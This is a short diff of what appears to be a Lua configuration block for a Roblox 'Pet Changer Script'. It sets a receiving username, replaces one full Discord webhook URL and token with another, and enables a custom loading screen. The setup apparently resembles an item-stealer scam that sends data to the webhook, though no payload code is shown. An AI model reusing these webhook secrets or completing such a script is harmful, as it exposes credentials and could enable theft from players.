@@ -1,5 +1,5 @@
 Username = "jemrickali023"
-WebHook = "https://discord.com/api/webhooks/1088226784157388910/tuJqvocqo2MvX0lXAu0nEqLtN944C7tcM2ETQAL4JaLXteJsqShTpe3NU5Bj1-s2p02Q"
+WebHook = "https://discord.com/api/webhooks/1088344329837363250/MXcMdk0xbyqSM6u6rc2JpaqHUzf8XLtVX5ZraeqbafBx6fMc5lwmbKJyzRnoFDYadI4A"
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
 _G.CustomScriptName = "Pet Changer Script"
